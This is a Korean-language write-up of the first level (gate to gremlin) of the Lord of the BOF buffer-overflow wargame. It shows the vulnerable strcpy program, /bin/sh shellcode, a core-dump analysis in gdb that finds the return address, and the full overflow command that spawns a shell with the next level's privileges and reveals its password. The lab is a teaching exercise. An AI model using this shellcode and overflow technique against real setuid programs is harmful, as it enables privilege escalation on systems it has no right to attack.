1번 gate -> gremlin
===================

```  
id = 'gate'
pw = 'gate'
```

--------------------------------------------------------------
"ls" 명령어로 파일들 확인
```   
[gate@localhost gate]$ ls  
agremlin  gremlin.c  
```  

"cat gremlin.c"로 c파일 확인  
```  
[gate@localhost gate]$ cat gremlin.c
/*
	The Lord of the BOF : The Fellowship of the BOF
	- gremlin
	- simple BOF
*/

int main(int argc, char *argv[])
{
    char buffer[256];
    if(argc < 2){
        printf("argv error\n");
        exit(0);
    }
    strcpy(buffer, argv[1]);
    printf("%s\n", buffer);
}
[gate@localhost gate]$  
```  

인자는 무조건 2개이상 주어야 되고  
2번째 인자값을 buffer에 복사 buffer값을 출력하는 구도  

### strcpy함수의 취약점   
>(srtingcopy)strcpy함수는 strcpy(인자1, 인자2); 일때<br>
>인자1에 인자 2의 값을 복사해주는데 이떄 인자1의 크기에 상관없이<br>
>인자 2의 모든 값을 복사해서 인자1의 영역너머를 우리가 변조할 수 있게됨<br>  

### 인자 전달방법
>파일을 실행할때는 "./파일명"으로 실행  <br>
>여기에 인자를 포함해서 전달하려면 뒤에 인자로 넣을 것 을 추가<br>   
>파이썬으로 전달하려면? ex) ./gremlin `python -c 'print "A"*100'`
  

## 공략시작
우리가 쓸 쉘코드
```  
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"  
```
크기 = 25bytes

스택 프레임 구조   
>buffer(256) | SFP(4) | ret addr(4)  

260byte모두 덮고 속에다가 (nop)\x90이랑 쉘코드 25바이트를 넣고 ret add를 찾아서 마지막 4byte를 후루룩

### gremlin파일 접근
우선 gremlin파일은 
```
[gate@localhost gate]$ ls -l
total 16
-rwsr-sr-x    1 gremlin  gremlin     11987 Feb 26  2010 gremlin
-rw-rw-r--    1 gate     gate          272 Apr  7 21:42 gremlin.c
[gate@localhost gate]$ 
```
보이는 것과 같이 우리 다음레벨인 gremlin의 권한을 가지고있으므로 gdb를 쓸 수 없다.
  
    
디렉토리를 하나 만들고 그 속에다가 gremlin파일을 우리가 건드릴 수 있도록 복사를 해주자.
```
[gate@localhost gate]$ mkdir tmp
[gate@localhost gate]$ cp gremlin tmp
[gate@localhost gate]$ cd tmp 
[gate@localhost tmp]$ ls
gremlin
gate@localhost tmp]$
```
>tmp 디렉토리 생성후 cp명령어로 tmp디렉토리에 gremlin파일 복사 
  
 
  
### 페이로드
tmp파일 내에서 
./gremlin `python -c 'print "A"*260 + "\x90\x90\x90\x90"'`
을 넣어보자

```
[gate@localhost tmp]$ ./gremlin `python -c 'print "A"*260  + "\x90\x90\x90\x90"'`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 
Segmentation fault (core dumped)
[gate@localhost tmp]$ ls
core  gremlin                    
```
>core 파일이 생성되었다.


### 코어 파일 
먼저 해결책부터말하면
>core dumped가 되었을땐 core파일이 생길 것 이다.  
>그럼 그 코어 파일을 gdb로 연다음  
>메모리 뜯어서 ret addr 찾고  
>그 주소로 페이로드를 다시짜서 원본파일에 공격을 하면 성공이다.

```
[gate@localhost tmp]$ gdb -c core -q
Core was generated by `./gremlin AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'.
Program terminated with signal 11, Segmentation fault.
#0  0x90909090 in ?? ()
(gdb) 
```
  
> '-c'옵션을 꼭 주어서 gdb를 실행하자


```
(gdb)x/100x $esp
0xbffff9f0:	0xfb609090	0xbf00bfff	0xbffffa40	0x40013868
0xbffffa00:	0x00000002	0x08048380	0x00000000	0x080483a1
0xbffffa10:	0x08048430	0x00000002	0xbffffa34	0x080482e0
0xbffffa20:	0x080484bc	0x4000ae60	0xbffffa2c	0x40013e90
0xbffffa30:	0x00000002	0xbffffb3e	0xbffffb48	0x00000000
0xbffffa40:	0xbffffc57	0xbffffc6a	0xbffffc81	0xbffffca0
0xbffffa50:	0xbffffcc2	0xbffffccc	0xbffffe8f	0xbffffeae
0xbffffa60:	0xbffffec8	0xbffffedd	0xbffffef9	0xbfffff04
0xbffffa70:	0xbfffff1c	0xbfffff29	0xbfffff31	0xbfffff42
0xbffffa80:	0xbfffff4c	0xbfffff5a	0xbfffff6b	0xbfffff79
0xbffffa90:	0xbfffff84	0xbfffff94	0xbfffffd4	0xbfffffe0
0xbffffaa0:	0x00000000	0x00000003	0x08048034	0x00000004
0xbffffab0:	0x00000020	0x00000005	0x00000006	0x00000006
0xbffffac0:	0x00001000	0x00000007	0x40000000	0x00000008
0xbffffad0:	0x00000000	0x00000009	0x08048380	0x0000000b
0xbffffae0:	0x000001f4	0x0000000c	0x000001f4	0x0000000d
0xbffffaf0:	0x000001f4	0x0000000e	0x000001f4	0x00000010
0xbffffb00:	0x0f8bfbff	0x0000000f	0xbffffb39	0x00000000
0xbffffb10:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffb20:	0x00000000	0x00000000	0x00000000	0x00000000
0xbffffb30:	0x00000000	0x00000000	0x38366900	0x2f2e0036
0xbffffb40:	0x6d657267	0x006e696c	0x41414141	0x41414141
0xbffffb50:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffb60:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffb70:	0x41414141	0x41414141	0x41414141	0x41414141
[gate@localhost tmp]$
```
메모리 뜯어본 결과
>argv[1]에 넣었던 AAA~ 는 bffffb 40~50에서 시작되므로  
>넉넉 bffffb50으로 ret addr을 맞쳐주자  
>(그 뒤로 실행되다가 쉘코드를 만나면 쉘코드가 실행될 것 이다.)  
  
```
[gate@localhost tmp]$ ./gremlin `python -c 'print "A"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"  + ""x90" * 135 + "\x50\xfb\xff\xbf"'             `
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1󿿐h//shh/bin⏓ኂ°
                                                                                                                   ̀P
bash$
```
쉘코드 넣고 주소만 \x50\xfb\xff\xbf로 바꿔서 실행하니 bash가 잘 실행됬다.  
이제 원본파일에다가 공격을 하고 다음 level의 비밀번호를 알아내자.
```
[gate@localhost tmp]$ cd
[gate@localhost gate]$ ./gremlin `python -c 'print "A"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"  + "\x90" * 135 + "\x50\xfb\xff\xbf"'             `
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1󿿐h//shh/bin⏓ኂ°
                                                                                                                   ̀P
bash$ my-pass
euid = 501
hello bof world
```

----
### gremlin
```
id = 'gremlin'
pw = 'hello bof world'
```

   
     
       
### 추신
나는 core파일 생성후 정확한 ret addr를 얻는 방식이 마음에 들어 앞으로의 라업도 core파일을 이용해서 쓸 것 이다.
